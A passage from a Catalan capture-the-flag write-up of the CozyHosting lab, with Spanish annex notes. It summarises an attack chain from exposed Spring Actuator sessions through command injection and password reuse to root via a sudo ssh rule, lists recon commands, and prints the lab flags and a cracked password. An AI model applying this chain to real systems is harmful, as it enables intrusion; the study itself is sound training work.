L’escalada no va dependre d’una vulnerabilitat de kernel ni d’un binari SUID clàssic. El problema era una regla `sudoers` massa permissiva. Permetre `ssh` com a root amb arguments arbitraris va habilitar l’abús d’una funcionalitat legítima del client SSH.

---

## 21. Resum tècnic final

```text
1. Es valida la connectivitat contra 10.129.37.233.
2. Nmap descobreix únicament SSH i HTTP.
3. HTTP redirigeix a cozyhosting.htb.
4. Es resol cozyhosting.htb a /etc/hosts.
5. La landing mostra /login.
6. /error i rutes inexistents retornen JSON de backend.
7. El fuzzing descobreix endpoints Spring Boot Actuator.
8. /actuator/mappings revela /executessh.
9. /actuator/sessions filtra una sessió de kanderson.
10. Es reutilitza JSESSIONID per accedir al dashboard.
11. El panell mostra un formulari de parcheig automàtic.
12. El formulari envia host i username a /executessh.
13. Les proves benignes confirmen una operació SSH real des del backend.
14. Caràcters especials a username provoquen errors de /bin/bash.
15. Es confirma command injection.
16. Un callback HTTP sortint des de 10.129.37.233 confirma execució remota.
17. S’obté shell com a app.
18. A /app es localitza cloudhosting-0.0.1.jar.
19. application.properties exposa credencials PostgreSQL.
20. La base cozyhosting conté hashes bcrypt.
21. El hash d’admin es crackeja com manchesterunited.
22. La contrasenya es reutilitza per SSH com a josh.
23. sudo -l permet /usr/bin/ssh * com a root.
24. LocalCommand permet obtenir una shell root.
```

### Flags

```text
user.txt: d2f307799472b53e63932cffbae92e2b
root.txt: edba58633595f327570a0c2683f14201
```

---

## 22. Lliçons reutilitzables

### 1. Un hostname pot ser part essencial de la superfície

Quan Nmap mostra una redirecció a un domini, no convé enumerar només per IP. El hostname pot condicionar rutes, cookies i comportament de l’aplicació.

### 2. Els errors JSON ajuden a identificar el backend

Una landing estàtica pot ocultar una aplicació dinàmica. En aquest cas, `/login`, `/error` i els JSON de 404 van indicar que nginx no era tota la història.

### 3. Actuator exposat pot ser crític

Spring Boot Actuator no només mostra salut. Si està mal configurat, pot revelar endpoints interns, variables d’entorn, mappings, beans i sessions actives.

### 4. Una sessió filtrada val més que un usuari filtrat

L’explotació no va dependre de conèixer `kanderson` com a nom, sinó de reutilitzar el seu `JSESSIONID` actiu.

### 5. En panells autenticats cal separar UI, request i backend

El valor real del panell no era l’aspecte visual, sinó el formulari que enviava `host` i `username` a `/executessh`, connectat a un handler backend amb nom revelador.

### 6. Abans d’explotar, convé validar el comportament normal

Les proves amb `127.0.0.1`, `localhost` i `example.com` van demostrar que el backend executava una operació SSH real. Aquesta evidència va fer que les proves posteriors fossin dirigides i no a cegues.

### 7. En command injection importa la posició exacta del paràmetre

El patró inferit era semblant a `ssh <username>@<host>`. Per això `id` es contaminava com `id@127.0.0.1` si no es tallava la resta de la línia.

### 8. Un callback extern és una prova forta d’execució

La petició rebuda des de `10.129.37.233` al servidor local va demostrar execució remota millor que una simple diferència d’errors.

### 9. En Spring Boot, revisar el JAR és prioritari

El JAR conté classes, dependències i configuració. En aquest cas, `application.properties` va exposar credencials directes de PostgreSQL.

### 10. Una contrasenya d’aplicació pot pivotar a sistema

L’usuari `admin` de l’aplicació no era l’usuari SSH. La contrasenya crackejada es va reutilitzar a `josh`, usuari local real.

### 11. `sudo -l` s’ha d’analitzar segons les capacitats del binari

`ssh` sembla un client de connexió, però les seves opcions permeten executar ordres locals. Amb `sudo`, aquesta execució local es converteix en escalada.

---

## 23. Correccions editorials aplicades

Al cos principal es van corregir errors evidents de forma i transcripció per millorar llegibilitat i precisió:

- `CozHosting` es va normalitzar com `CozyHosting`.
- `nzip` es va tractar com a error d’escriptura i es va documentar la correcció a `unzip`.
- Expressions conversacionals o personals es van substituir per redacció tècnica neutral.
- Blocs repetitius d’“objectiu / mètode / resposta / comprovacions” es van integrar en una narrativa tècnica natural.
- Es van mantenir els errors operatius útils com a part de l’aprenentatge: cookie caducada, servidor HTTP en carpeta incorrecta, execució local accidental i sortida excessiva de `grep`.
- Les notes originals es van conservar íntegrament a l’annex final per a traçabilitat.

No es van afegir vies d’explotació que no estiguessin sustentades pels apunts originals. Les inferències incloses al cos principal es van marcar com a interpretació tècnica derivada de l’evidència observada.

---

## 24. Annex A — Notes originals conservades

El siguiente bloque conserva las notas originales de trabajo como trazabilidad del caso.

````````````text
# Iniciamos la explotación de la máquina CozHosting de Hack The Box.

# Inicio — Ejecución de `Inici-HTB`

## Preparación inicial automatizada

Al comenzar la máquina se ejecuta el script propio `Inici-HTB`, utilizado para preparar el entorno de trabajo y realizar una primera enumeración técnica controlada.

```bash
Inici-HTB <NOMBRE_MAQUINA> <IP_OBJETIVO>
```

Este script no explota nada. Su función es dejar el laboratorio ordenado desde el primer minuto, validar conectividad y generar una base mínima de evidencias para decidir la siguiente rama de trabajo.

---

## Qué prepara el script

`Inici-HTB` crea una estructura de trabajo separada para la máquina, con directorios destinados a organizar la enumeración, el contenido descargado, posibles pruebas posteriores y notas del caso.

Estructura genérica esperada:

```text
<directorio_maquina>/
├── content/
├── exploits/
├── nmap/
│   ├── allPorts
│   ├── extractPorts.txt
│   ├── nmap_tcp_services.txt
│   ├── ping.txt
│   └── whichSystem.txt
└── notes/
    ├── 00_resumen_inicial.md
    └── 01_siguiente_paso.txt
```

---

## Finalidad de cada directorio

### `content/`

Directorio reservado para material obtenido durante la enumeración o el análisis posterior:

- páginas descargadas;
- ficheros públicos;
- respuestas HTTP;
- artefactos útiles;
- resultados de herramientas específicas;
- documentación o evidencias relevantes.

### `exploits/`

Directorio reservado para pruebas o material de explotación usado por el operador del laboratorio, cuando proceda.

No se utiliza en la fase inicial salvo que más adelante se confirme una vía concreta y justificada.

### `nmap/`

Directorio donde se guardan las evidencias de conectividad y enumeración inicial.

Archivos principales:

- `ping.txt`
  Guarda la comprobación inicial de conectividad contra la IP objetivo.

- `whichSystem.txt`
  Guarda la estimación inicial del sistema operativo, normalmente a partir de TTL u otras señales tempranas.

- `allPorts`
  Guarda el resultado del escaneo completo de puertos TCP abiertos.

- `extractPorts.txt`
  Guarda la extracción de puertos abiertos para reutilizarlos en el escaneo de servicios.

- `nmap_tcp_services.txt`
  Guarda el escaneo detallado de servicios, versiones y scripts básicos sobre los puertos abiertos.

### `notes/`

Directorio donde se crean notas iniciales del caso.

Archivos generados:

- `00_resumen_inicial.md`
  Resume los datos iniciales de la máquina: IP, fecha, sistema estimado, puertos abiertos, servicios detectados, superficie dominante sugerida, ramas secundarias y siguiente paso único.

- `01_siguiente_paso.txt`
  Guarda de forma aislada el siguiente paso recomendado para continuar con el roadmap correspondiente.

---

## Qué ejecuta el script de forma resumida

El flujo automatizado realiza estas acciones:

1. registra el objetivo de trabajo;
2. prepara el árbol de directorios;
3. valida conectividad con `ping`;
4. estima el sistema operativo con `whichSystem.py`;
5. ejecuta un escaneo completo de puertos TCP;
6. extrae los puertos abiertos;
7. ejecuta un escaneo de servicios sobre esos puertos;
8. infiere una superficie dominante inicial;
9. propone ramas secundarias;
10. genera un resumen inicial;
11. deja escrito un siguiente paso único.

---

## Lectura didáctica del arranque

El objetivo de esta fase no es encontrar ya la vulnerabilidad principal, sino evitar empezar el caso de forma desordenada.

La ejecución de `Inici-HTB` permite responder rápidamente a preguntas básicas:

- ¿el objetivo responde?
- ¿qué puertos están abiertos?
- ¿qué servicios están expuestos?
- ¿hay una web dominante?
- ¿parece un entorno Linux o Windows?
- ¿aparece SSH, SMB, FTP, HTTP u otro servicio relevante?
- ¿qué rama del roadmap tiene más sentido abrir primero?

---

## Evidencia inicial que se debe revisar después del script

Tras ejecutar `Inici-HTB`, se revisan especialmente estos archivos:

```bash
cat nmap/ping.txt
cat nmap/whichSystem.txt
cat nmap/extractPorts.txt
cat nmap/nmap_tcp_services.txt
cat notes/00_resumen_inicial.md
cat notes/01_siguiente_paso.txt
```

La revisión no debe limitarse a mirar puertos. Hay que interpretar qué superficie domina el caso y qué rama merece prioridad.

---

## Criterio de decisión tras el arranque

La salida correcta de esta fase debe ser una decisión clara:

```text
Superficie dominante:
Rama principal:
Ramas secundarias:
Siguiente paso único:
```

Ejemplos de decisión:

- si domina HTTP/HTTPS → continuar con `WEB-BASE`;
- si aparece login o panel claro → valorar `WEB-AUTH / PANEL`;
- si aparecen SMB, Kerberos, LDAP y dominio → valorar rama `AD / SMB / KERBEROS`;
- si aparece una credencial reutilizable → valorar `CREDENCIALES`;
- si SSH queda abierto pero sin credenciales → dejarlo como rama secundaria.

---

## Nota metodológica

`Inici-HTB` no sustituye al análisis manual.

Su valor está en dejar el inicio de la máquina ordenado, repetible y documentado. A partir de sus resultados se debe revisar la evidencia, confirmar la superficie dominante y continuar con el roadmap correspondiente.

La regla principal es:

```text
no explotar por intuición;
decidir por evidencia observada.
```

## Salida de la fase de arranque:

❯ Inici-HTB CozyHosting 10.129.37.233 easy
[*] Fijando objetivo en Polybar con settarget
[*] Preparando directorio base
[*] Comprobando conectividad inicial
PING 10.129.37.233 (10.129.37.233) 56(84) bytes of data.
64 bytes from 10.129.37.233: icmp_seq=1 ttl=63 time=46.3 ms

--- 10.129.37.233 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 46.279/46.279/46.279/0.000 ms
[*] Intentando identificación rápida con whichSystem.py

10.129.37.233 (ttl -> 63): Linux

[*] Lanzando escaneo completo de puertos
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-02 12:57 CEST
Initiating SYN Stealth Scan at 12:57
Scanning 10.129.37.233 [65535 ports]
Discovered open port 80/tcp on 10.129.37.233
Discovered open port 22/tcp on 10.129.37.233
Completed SYN Stealth Scan at 12:57, 12.29s elapsed (65535 total ports)
Nmap scan report for 10.129.37.233
Host is up, received user-set (0.055s latency).
Scanned at 2026-05-02 12:57:09 CEST for 13s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.43 seconds
           Raw packets sent: 66281 (2.916MB) | Rcvd: 65536 (2.621MB)
[*] Extrayendo puertos abiertos
[*] Puertos abiertos detectados: 22,80
[*] Lanzando escaneo de servicios
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-02 12:57 CEST
Nmap scan report for 10.129.37.233
Host is up (0.049s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.43 seconds
[*] Resumen inicial generado en: /home/r4mon/pentest/targets/HTB/easy/CozyHosting/notes/00_resumen_inicial.md
[*] Siguiente paso generado en: /home/r4mon/pentest/targets/HTB/easy/CozyHosting/notes/01_siguiente_paso.txt
[*] Flujo inicial completado

## Objetivo

Analizaremos la primera salida de la enumeración de CozyHosting y cerraremos la fase inicial con una decisión técnica clara, trazable y útil.

## Hechos verificados

La máquina trabajada es CozyHosting, dificultad easy, con IP objetivo:

10.129.37.233

La conectividad inicial está confirmada. El objetivo responde a ping con 0% de pérdida:

1 packets transmitted, 1 received, 0% packet loss

La identificación rápida por TTL devuelve:

10.129.37.233 (ttl -> 63): Linux

El escaneo completo TCP detecta únicamente dos puertos abiertos:

22/tcp open  ssh
80/tcp open  http

El escaneo de servicios identifica SSH en el puerto 22:

OpenSSH 8.9p1 Ubuntu 3ubuntu0.3

El escaneo de servicios identifica HTTP en el puerto 80:

nginx 1.18.0 (Ubuntu)

El servicio HTTP no entrega directamente la web por IP, sino que redirige a un hostname:

http://cozyhosting.htb

Nmap lo muestra así:

http-title: Did not follow redirect to http://cozyhosting.htb

La fase inicial ha generado los ficheros de notas:

/home/r4mon/pentest/targets/HTB/easy/CozyHosting/notes/00_resumen_inicial.md
/home/r4mon/pentest/targets/HTB/easy/CozyHosting/notes/01_siguiente_paso.txt

## Supuestos

La máquina es muy probablemente Linux/Ubuntu. Esta lectura se apoya en tres señales coherentes:

- TTL 63.
- Banner de OpenSSH sobre Ubuntu.
- Banner de nginx sobre Ubuntu.

El puerto 22 queda anotado como superficie secundaria. De momento no existe usuario, contraseña ni clave privada, por tanto SSH no es todavía la rama principal.

El puerto 80 es la superficie dominante inicial, porque presenta una aplicación web detrás de un hostname virtual.

El hostname cozyhosting.htb debe resolverse localmente antes de analizar la web. Si solo se accede por IP, la aplicación puede no comportarse igual que usando el dominio esperado.

## Método

La lectura correcta de esta primera fase es:

conectividad confirmada
→ puertos mínimos expuestos
→ HTTP con hostname virtual
→ SSH disponible pero sin credenciales
→ rama principal inicial: WEB-BASE
→ siguiente paso único: resolver cozyhosting.htb y observar la web por dominio

No hay evidencia suficiente para saltar a explotación.

No hay credenciales para usar SSH.

No hay todavía producto web identificado.

No hay todavía rutas internas enumeradas.

La prioridad metodológica es preparar correctamente la resolución del hostname y empezar WEB-BASE sobre el dominio real de la aplicación.

## Respuesta

El hallazgo dominante de esta primera salida es la redirección HTTP hacia cozyhosting.htb.

Esto indica que la aplicación está pensada para funcionar mediante nombre de dominio y no únicamente mediante IP. En este punto, analizar la web por IP podría producir errores, respuestas incompletas o una lectura falsa de la superficie real.

La rama principal queda fijada como WEB-BASE.

La rama secundaria queda fijada como SSH, pendiente de credenciales.

La siguiente acción única debe ser añadir el hostname al fichero /etc/hosts y repetir la observación web usando el dominio correcto.

## Comandos

Añadir resolución local del dominio:

sudo sh -c 'echo "10.129.37.233 cozyhosting.htb" >> /etc/hosts'

Comprobar que el dominio resuelve correctamente:

getent hosts cozyhosting.htb

Observar cabeceras por dominio:

curl -sS -I http://cozyhosting.htb

Observar HTML inicial:

curl -sS http://cozyhosting.htb | head -n 60

Identificar tecnologías visibles:

whatweb http://cozyhosting.htb

Revisar robots.txt si existe:

curl -sS http://cozyhosting.htb/robots.txt

Extraer enlaces visibles del HTML inicial:

curl -sS http://cozyhosting.htb | grep -oP 'href="\K[^"]+|src="\K[^"]+' | sort -u

Buscar palabras clave útiles en la respuesta inicial:

curl -sS http://cozyhosting.htb | grep -Ei 'login|signin|admin|panel|auth|password|reset|forgot|api|graphql|ajax|error|actuator'

## Comprobaciones

Debe comprobarse que cozyhosting.htb resuelve a 10.129.37.233.

Debe comprobarse si la web carga correctamente usando el dominio.

Debe comprobarse si aparecen rutas como:

- /login
- /admin
- /error
- /logout
- /actuator

Debe comprobarse si la aplicación muestra tecnología reconocible detrás de nginx.

Debe comprobarse si existe login, panel, endpoint de error o rutas de diagnóstico.

Debe comprobarse si SSH queda simplemente como servicio disponible o si más adelante una credencial permite convertirlo en vía de acceso.

## Notas:

La fase inicial queda cerrada con una superficie muy reducida: solo SSH y HTTP.

La decisión importante no es atacar SSH, sino reconocer que HTTP redirige a un hostname virtual. Ese detalle condiciona toda la enumeración posterior.

La primera rama activa es WEB-BASE porque el puerto 80 expone la aplicación principal.

SSH queda como rama secundaria hasta que aparezcan credenciales reutilizables.

El siguiente paso único es resolver cozyhosting.htb y comenzar la enumeración web por dominio.

## Ejecutamos:

❯ sudo sh -c 'echo "10.129.37.233 cozyhosting.htb" >> /etc/hosts'
❯ getent hosts cozyhosting.htb
10.129.37.233   cozyhosting.htb
10.129.37.233   cozyhosting.htb
❯ curl -sS -I http://cozyhosting.htb
HTTP/1.1 200
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 02 May 2026 11:21:47 GMT
Content-Type: text/html;charset=UTF-8
Connection: keep-alive
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Content-Language: en-US

❯ curl -sS http://cozyhosting.htb | head -n 60
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1.0" name="viewport">

    <title>Cozy Hosting - Home</title>

    <link href="assets/img/favicon.png" rel="icon">
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Nunito:300,300i,400,400i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i"
          rel="stylesheet">
    <link href="assets/vendor/aos/aos.css" rel="stylesheet">
    <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
    <link href="assets/css/style.css" rel="stylesheet">

    <!-- =======================================================
    * Template Name: FlexStart
    * Updated: Mar 10 2023 with Bootstrap v5.2.3
    * Template URL: https://bootstrapmade.com/flexstart-bootstrap-startup-template/
    * Author: BootstrapMade.com
    * License: https://bootstrapmade.com/license/
    ======================================================== -->
</head>

<body>

<header id="header" class="header fixed-top">
    <div class="container-fluid container-xl d-flex align-items-center justify-content-between">

        <a href="index.html" class="logo d-flex align-items-center">
            <img src="assets/img/logo.png" alt="">
            <span>Cozy Hosting</span>
        </a>

        <nav id="navbar" class="navbar">
            <ul>
                <li><a class="nav-link scrollto active" href="#hero">Home</a></li>
                <li><a class="nav-link scrollto" href="#values">Services</a></li>
                <li><a class="nav-link scrollto" href="#pricing">Pricing</a></li>
                <li><a class="getstarted scrollto" href="/login">Login</a></li>
            </ul>
            <i class="bi bi-list mobile-nav-toggle"></i>
        </nav>

    </div>
</header>


<section id="hero" class="hero d-flex align-items-center">

    <div class="container">
        <div class="row">
            <div class="col-lg-6 d-flex flex-column justify-content-center">
                <h1 data-aos="fade-up">We offer modern solutions for growing your business</h1>
                <h2 data-aos="fade-up" data-aos-delay="400">Host a project of any size and complexity with Cozy
                    Hosting</h2>
                <div data-aos="fade-up" data-aos-delay="600">
                    <div class="text-center text-lg-start">
curl: (23) Failure writing output to destination
❯ whatweb http://cozyhosting.htb
http://cozyhosting.htb [200 OK] Bootstrap, Content-Language[en-US], Country[RESERVED][ZZ], Email[info@cozyhosting.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.37.233], Lightbox, Script, Title[Cozy Hosting - Home], UncommonHeaders[x-content-type-options], X-Frame-Options[DENY], X-XSS-Protection[0], nginx[1.18.0]
❯ curl -sS http://cozyhosting.htb/robots.txt
{"timestamp":"2026-05-02T11:22:38.811+00:00","status":404,"error":"Not Found","path":"/robots.txt"}%                                                                                                                           ❯ curl -sS http://cozyhosting.htb | grep -oP 'href="\K[^"]+|src="\K[^"]+' | sort -u
#
assets/css/style.css
assets/img/favicon.png
assets/img/hero-img.png
assets/img/logo.png
assets/img/pricing-business.png
assets/img/pricing-free.png
assets/img/pricing-starter.png
assets/img/pricing-ultimate.png
assets/img/values-1.png
assets/img/values-2.png
assets/img/values-3.png
assets/js/main.js
assets/vendor/aos/aos.css
assets/vendor/aos/aos.js
assets/vendor/bootstrap/css/bootstrap.min.css
assets/vendor/bootstrap-icons/bootstrap-icons.css
assets/vendor/bootstrap/js/bootstrap.bundle.min.js
assets/vendor/glightbox/js/glightbox.min.js
assets/vendor/swiper/swiper-bundle.min.js
#hero
https://bootstrapmade.com/
https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Nunito:300,300i,400,400i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i
index.html
/login
#pricing
#values
❯ curl -sS http://cozyhosting.htb | grep -Ei 'login|signin|admin|panel|auth|password|reset|forgot|api|graphql|ajax|error|actuator'
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Nunito:300,300i,400,400i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i"
    * Author: BootstrapMade.com
                <li><a class="getstarted scrollto" href="/login">Login</a></li>
                        <h3>All admin tools you'll ever need</h3>
                        <p>Rich administrative dashboard to take care of host management, including monitoring, host
                            <li>Access to admin interface</li>
                            <li>Full admin interface</li>
                            <li>Full admin interface</li>
                            <li>Full admin interface</li>

## Objetivo

Analizar la segunda salida de enumeración web de CozyHosting, interpretar las señales observadas y decidir el siguiente paso único dentro de la rama WEB-BASE.

## Hechos verificados

El dominio cozyhosting.htb ya resuelve correctamente contra la IP objetivo:

10.129.37.233 cozyhosting.htb

Aparece duplicado en la resolución local, lo que indica que probablemente se ha añadido dos veces al fichero /etc/hosts:

10.129.37.233   cozyhosting.htb
10.129.37.233   cozyhosting.htb

La web responde correctamente por dominio con código HTTP 200:

HTTP/1.1 200

El servidor sigue identificado como:

nginx/1.18.0 (Ubuntu)

La respuesta HTTP incluye cabeceras de seguridad habituales:

X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Cache-Control: no-cache, no-store, max-age=0, must-revalidate

El contenido principal corresponde a una landing de Cozy Hosting:

<title>Cozy Hosting - Home</title>

El HTML muestra una plantilla Bootstrap llamada FlexStart:

Template Name: FlexStart
Updated: Mar 10 2023 with Bootstrap v5.2.3
Author: BootstrapMade.com

La página pública incluye un enlace directo a:

/login

La extracción de enlaces confirma recursos estáticos normales:

assets/css/style.css
assets/js/main.js
assets/img/logo.png
assets/vendor/bootstrap/css/bootstrap.min.css
assets/vendor/bootstrap/js/bootstrap.bundle.min.js

El fichero robots.txt no existe como recurso estático tradicional. La respuesta devuelve un JSON de error:

{"timestamp":"2026-05-02T11:22:38.811+00:00","status":404,"error":"Not Found","path":"/robots.txt"}

La búsqueda de palabras clave en el HTML detecta referencias a:

- /login
- admin
- administrative dashboard
- admin interface

No se ha observado todavía acceso autenticado real, credenciales, token ni panel accesible.

## Supuestos

La web pública parece una landing corporativa apoyada en una plantilla Bootstrap, pero no debe descartarse como simple página estática porque existe una ruta de login.

La respuesta JSON del 404 es una señal relevante. No parece un 404 plano servido únicamente por nginx, sino una respuesta generada por una aplicación backend.

La presencia de cabeceras como X-Frame-Options, no-cache y una respuesta JSON estructurada encaja con una aplicación web detrás de nginx, posiblemente con framework backend.

Las referencias comerciales a “admin interface” dentro del HTML todavía no demuestran un panel real. Por ahora solo son texto de la landing.

La ruta /login sí es una señal técnica real y justifica revisar el flujo de autenticación.

## Método

La lectura correcta de esta fase es:

hostname resuelto
→ web carga correctamente por dominio
→ landing pública basada en Bootstrap
→ ruta /login confirmada
→ 404 JSON generado por backend
→ posible aplicación dinámica detrás de nginx
→ siguiente paso único: revisar /login y /error

No conviene tratar todavía las frases “admin interface” del HTML como evidencia de acceso administrativo.

Tampoco conviene saltar directamente a explotación. La señal útil ahora es identificar qué tecnología hay detrás de nginx y si el login pertenece a una aplicación real.

El error de curl observado:

curl: (23) Failure writing output to destination

no indica un fallo de la web. Es un efecto normal cuando curl sigue escribiendo pero head ya ha cerrado la lectura después de mostrar las primeras líneas. No debe tratarse como hallazgo del objetivo.

## Respuesta

El hallazgo dominante ahora es la combinación de una ruta /login visible y una respuesta 404 en JSON generada por backend.

La landing pública por sí sola no aporta explotación directa, pero sí confirma que la web funciona correctamente mediante el hostname cozyhosting.htb.

La rama principal sigue siendo WEB-BASE, pero ya está cerca de pasar a WEB-AUTH / PANEL si /login confirma un flujo de autenticación real.

La rama secundaria sigue siendo SSH, pendiente de credenciales.

El siguiente paso único debe ser revisar /login y /error, porque esas rutas pueden confirmar:

- si existe formulario real de autenticación;
- si hay framework backend identificable;
- si la aplicación devuelve errores característicos;
- si hay rutas internas que merezcan enumeración específica.

## Comandos

Revisar cabeceras de la ruta de login:

curl -sS -I http://cozyhosting.htb/login

Ver el HTML inicial del login:

curl -sS http://cozyhosting.htb/login | head -n 80

Revisar la ruta de error:

curl -sS -i http://cozyhosting.htb/error | head -n 80

Comprobar si el backend devuelve JSON en rutas inexistentes:

curl -sS -i http://cozyhosting.htb/noexiste | head -n 80

Buscar formularios, métodos y campos en el login:

curl -sS http://cozyhosting.htb/login | grep -Ei 'form|method|action|input|username|user|password|csrf|token|remember'

Buscar referencias útiles en JavaScript o HTML del login:

curl -sS http://cozyhosting.htb/login | grep -Ei 'admin|dashboard|actuator|api|session|error|spring|boot|csrf|logout'

## Comprobaciones

Debe comprobarse si /login devuelve un formulario real.

Debe comprobarse si el formulario usa método POST.

Debe comprobarse si aparecen campos como username, password, remember-me, csrf o token.

Debe comprobarse si /error muestra una página de error característica.

Debe comprobarse si las rutas inexistentes devuelven siempre JSON con timestamp, status, error y path.

Debe comprobarse si el backend deja pistas de tecnología en errores, títulos, cabeceras o nombres de campos.

Debe comprobarse si existe una diferencia clara entre:

- landing pública;
- login;
- error de backend;
- posible panel protegido.

## Notas para el informe

La enumeración web confirma que el dominio virtual era necesario para acceder correctamente a la aplicación.

La web pública parece inicialmente una landing corporativa, pero el enlace /login y los errores JSON indican que hay una aplicación backend real detrás de nginx.

La frase “admin interface” aparece en el contenido comercial de la página, pero todavía no prueba la existencia de un panel accesible.

La decisión metodológica correcta es no explotar todavía, sino perfilar el flujo de login y la tecnología backend.

Hallazgo dominante actual:

landing pública
→ /login visible
→ 404 JSON de backend
→ posible aplicación dinámica
→ revisar /login y /error

Rama principal activa:

WEB-BASE

Rama secundaria:

SSH pendiente de credenciales

Siguiente paso único:

analizar /login y /error para confirmar autenticación real y tecnología backend.

## Objetivo

Analizar la salida de revisión de /login, /error y rutas inexistentes en CozyHosting para determinar si la rama WEB-BASE debe mantenerse o si ya existe señal suficiente para pasar a WEB-AUTH / PANEL o a enumeración específica de backend.

## Hechos verificados

El endpoint /login responde correctamente con código HTTP 200:

HTTP/1.1 200

El servidor sigue siendo:

nginx/1.18.0 (Ubuntu)

La página de login tiene título propio:

Login - Cozy Hosting

El formulario de autenticación existe y envía credenciales por POST a la propia ruta /login:

<form action="/login" method="post" class="row g-3 needs-validation">

Los campos relevantes del formulario son:

username
password
remember

El campo remember usa el valor:

true

No aparece un campo CSRF visible en el HTML del formulario.

La plantilla usada en la página de login es NiceAdmin:

Template Name: NiceAdmin
Updated: Mar 09 2023 with Bootstrap v5.2.3

La ruta /error responde con código HTTP 500 y contenido JSON:

HTTP/1.1 500
Content-Type: application/json

La respuesta de /error contiene:

{"timestamp":"2026-05-02T11:27:57.289+00:00","status":999,"error":"None"}

Una ruta inexistente, como /noexiste, devuelve código HTTP 404 y JSON estructurado:

{"timestamp":"2026-05-02T11:28:22.877+00:00","status":404,"error":"Not Found","path":"/noexiste"}

La respuesta de /noexiste incluye cabeceras Vary relacionadas con CORS:

Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers

No se han observado todavía credenciales válidas, sesión autenticada, token, panel accesible ni usuario confirmado.

## Supuestos

La aplicación no parece una web estática pura. Aunque nginx actúa como servidor frontal, las respuestas JSON estructuradas indican que existe una aplicación backend procesando rutas y errores.

La combinación de formulario POST /login, cabeceras de seguridad, respuesta JSON con timestamp/status/error/path y comportamiento de /error apunta razonablemente a una aplicación Java/Spring o framework similar.

La ruta /login confirma que existe un flujo de autenticación real, pero todavía no confirma acceso autenticado.

La ausencia de un campo CSRF visible puede ser relevante, pero no debe interpretarse todavía como vulnerabilidad. Solo queda anotada como característica del formulario.

Las menciones a NiceAdmin y BootstrapMade indican plantilla visual, no tecnología backend ni vulnerabilidad por sí mismas.

## Método

La lectura correcta de esta fase es:

/login confirmado
→ formulario POST real
→ campos username/password/remember
→ /error y rutas inexistentes devuelven JSON de backend
→ backend dinámico probable
→ autenticación real todavía no validada
→ siguiente paso único: enumerar rutas específicas del backend

La rama WEB-BASE sigue activa, pero ya existe una señal clara de autenticación. La transición a WEB-AUTH / PANEL quedará justificada cuando se confirme alguno de estos puntos:

- /admin existe y está protegido.
- /login permite crear una sesión.
- aparece una cookie de sesión.
- se detecta un endpoint de sesiones, usuario, dashboard o administración.
- se localiza una superficie de diagnóstico o backend sensible.

Antes de probar credenciales o forzar autenticación, conviene terminar una enumeración corta y dirigida de rutas. La prioridad no es atacar el login a ciegas, sino descubrir qué expone realmente la aplicación.

## Respuesta

El hallazgo dominante ahora es que /login es un formulario real de autenticación y que los errores no son páginas estáticas de nginx, sino respuestas JSON generadas por una aplicación backend.

Esto cambia la lectura de la web: la landing pública era solo la fachada, mientras que /login y /error demuestran que hay una aplicación dinámica detrás.

La rama principal sigue siendo WEB-BASE durante una comprobación más, pero con transición probable hacia WEB-AUTH / PANEL.

La rama secundaria SSH sigue en espera, sin credenciales.

La siguiente acción única debe ser una enumeración corta de rutas backend y rutas de diagnóstico, prestando especial atención a rutas típicas de aplicaciones Java/Spring como /actuator, /actuator/health, /actuator/env, /actuator/mappings y /actuator/sessions.

## Comandos

Comprobar si /admin existe y cómo responde sin autenticación:

curl -sS -i http://cozyhosting.htb/admin | head -n 80

Comprobar si /logout existe y cómo responde:

curl -sS -i http://cozyhosting.htb/logout | head -n 80

Comprobar si existe el endpoint base de actuator:

curl -sS -i http://cozyhosting.htb/actuator | head -n 80

Comprobar health de actuator:

curl -sS -i http://cozyhosting.htb/actuator/health | head -n 80

Comprobar mappings de actuator:

curl -sS -i http://cozyhosting.htb/actuator/mappings | head -n 120

Comprobar sesiones expuestas si existe actuator:

curl -sS -i http://cozyhosting.htb/actuator/sessions | head -n 80

Hacer fuzzing corto con lista común:

ffuf -u http://cozyhosting.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc all -fc 404

Si existe wordlist específica de Spring Boot:

